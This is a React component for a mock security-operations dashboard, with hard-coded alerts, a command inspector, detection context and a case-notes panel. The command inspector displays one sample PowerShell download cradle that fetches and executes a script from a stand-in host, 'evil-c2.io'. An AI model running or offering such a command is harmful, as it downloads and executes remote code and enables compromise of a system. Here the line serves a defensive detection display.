import React, { useState } from 'react';
import { Send, Terminal, Shield } from 'lucide-react';

const mockAlerts = [
    { id: 1, time: '03:43:42', severity: 'HIGH', rule: 'Suspicious Office Child Process', host: 'SEC-WKSTN-01', status: 'ACKNOWLEDGE' },
    { id: 2, time: '03:43:42', severity: 'CRITICAL', rule: 'Suspicious Download Cradle', host: 'SEC-WKSTN-01', status: 'ACKNOWLEDGE' },
    { id: 3, time: '03:42:42', severity: 'HIGH', rule: 'Suspicious Office Child Process', host: 'SEC-WKSTN-01', status: 'ACKNOWLEDGE' },
    { id: 4, time: '03:42:42', severity: 'CRITICAL', rule: 'Suspicious Download Cradle', host: 'SEC-WKSTN-01', status: 'ACKNOWLEDGE' },
    { id: 5, time: '03:37:42', severity: 'HIGH', rule: 'Suspicious Office Child Process', host: 'SEC-WKSTN-01', status: 'ACKNOWLEDGE' },
];

const Intelligence = () => {
    const [selectedAlert, setSelectedAlert] = useState(mockAlerts[0]);

    return (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>

            {/* Action Bar */}
            <div style={{ display: 'flex', gap: '16px', alignItems: 'center' }}>
                <button className="btn btn-primary" style={{ borderRadius: '20px', padding: '0.5rem 1.5rem', fontWeight: 600 }}>
                    ACTIVE ALERTS (12)
                </button>
                <button className="btn btn-ghost" style={{ borderRadius: '20px', color: 'var(--text-secondary)' }}>
                    LIVE TELEMETRY
                </button>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '24px' }}>

                {/* Main List */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
                    <div className="card" style={{ padding: 0, overflow: 'hidden' }}>
                        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.85rem' }}>
                            <thead>
                                <tr style={{ borderBottom: '1px solid var(--border-color)', color: 'var(--text-secondary)', textAlign: 'left' }}>
                                    <th style={{ padding: '16px', fontWeight: 600 }}>TIMESTAMP</th>
                                    <th style={{ padding: '16px', fontWeight: 600 }}>SEVERITY</th>
                                    <th style={{ padding: '16px', fontWeight: 600 }}>DETECTION RULE</th>
                                    <th style={{ padding: '16px', fontWeight: 600 }}>HOST</th>
                                    <th style={{ padding: '16px', fontWeight: 600 }}>STATUS</th>
                                </tr>
                            </thead>
                            <tbody>
                                {mockAlerts.map((alert) => (
                                    <tr key={alert.id} style={{ borderBottom: '1px solid var(--border-color)', cursor: 'pointer' }} onClick={() => setSelectedAlert(alert)}>
                                        <td style={{ padding: '16px' }}>{alert.time}</td>
                                        <td style={{ padding: '16px' }}>
                                            <span className={`status-badge ${alert.severity === 'CRITICAL' ? 'status-critical' : 'status-high'}`}>
                                                {alert.severity}
                                            </span>
                                        </td>
                                        <td style={{ padding: '16px', fontWeight: 500 }}>{alert.rule}</td>
                                        <td style={{ padding: '16px', color: 'var(--text-muted)' }}>{alert.host}</td>
                                        <td style={{ padding: '16px', color: 'var(--sentinel-green)' }}>{alert.status}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>

                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
                        {/* Command Inspector */}
                        <div className="card">
                            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
                                <span style={{ fontSize: '0.8rem', fontWeight: 600, letterSpacing: '0.05em' }}>COMMAND INSPECTOR</span>
                                <span style={{ fontSize: '0.7rem', padding: '2px 6px', background: '#374151', borderRadius: '4px' }}>PID: 6422</span>
                            </div>
                            <div style={{
                                background: '#0D0E15',
                                borderRadius: '8px',
                                padding: '16px',
                                fontFamily: 'monospace',
                                fontSize: '0.85rem',
                                color: 'var(--sentinel-green)',
                                lineHeight: '1.5',
                                minHeight: '150px'
                            }}>
                                powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil-c2.io/p.ps1')"
                            </div>
                        </div>

                        {/* Detection Context */}
                        <div className="card">
                            <div style={{ fontSize: '0.8rem', fontWeight: 600, letterSpacing: '0.05em', marginBottom: '24px' }}>DETECTION CONTEXT</div>
                            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px', fontSize: '0.85rem' }}>
                                <span style={{ color: 'var(--text-muted)' }}>Parent Process</span>
                                <span style={{ fontWeight: 600 }}>wmiprvse.exe</span>
                            </div>
                            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px', fontSize: '0.85rem' }}>
                                <span style={{ color: 'var(--text-muted)' }}>User Account</span>
                                <span style={{ color: 'var(--sentinel-blue)' }}>CORP\Administrator</span>
                            </div>
                            <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 'auto', fontSize: '0.85rem' }}>
                                <span style={{ color: 'var(--text-muted)' }}>Confidence Score</span>
                                <span style={{ color: 'var(--sentinel-red)', fontWeight: 700 }}>80%</span>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Right Panel - Active Case */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
                    <div className="card">
                        <div style={{ fontSize: '0.75rem', color: 'var(--sentinel-green)', marginBottom: '8px' }}>ACTIVE CASE</div>
                        <div style={{ fontSize: '1.1rem', fontWeight: 700, marginBottom: '24px' }}>LOTL-2024-MAY-001</div>

                        <div style={{ display: 'flex', gap: '16px', borderBottom: '1px solid var(--border-color)', paddingBottom: '12px', marginBottom: '16px' }}>
                            <span style={{ fontSize: '0.85rem', fontWeight: 600, borderBottom: '2px solid var(--sentinel-green)', paddingBottom: '12px' }}>NOTES (1)</span>
                            <span style={{ fontSize: '0.85rem', color: 'var(--text-muted)' }}>ARTIFACTS (0)</span>
                        </div>

                        <div style={{ position: 'relative', marginBottom: '24px' }}>
                            <input className="input-field" placeholder="Add a case note..." style={{ paddingRight: '40px' }} />
                            <Send size={16} color="var(--sentinel-green)" style={{ position: 'absolute', right: '12px', top: '50%', transform: 'translateY(-50%)' }} />
                        </div>

                        <div style={{ background: '#232533', borderRadius: '8px', padding: '16px' }}>
                            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
                                <span style={{ fontSize: '0.85rem', color: 'var(--sentinel-blue)', fontWeight: 600 }}>J. HARKNESS</span>
                                <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>10:05:00</span>
                            </div>
                            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', margin: 0 }}>
                                Case initialized after detection of PowerShell download cradle.
                            </p>
                        </div>
                    </div>

                    <div className="card" style={{ marginTop: 'auto' }}>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                            <button className="btn btn-primary" style={{ width: '100%', fontWeight: 700 }}>
                                GENERATE REPORT
                            </button>
                            <button className="btn btn-ghost" style={{ width: '100%', border: '1px solid var(--border-color)', color: 'var(--sentinel-red)' }}>
                                CLOSE CASE
                            </button>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    );
};

export default Intelligence;
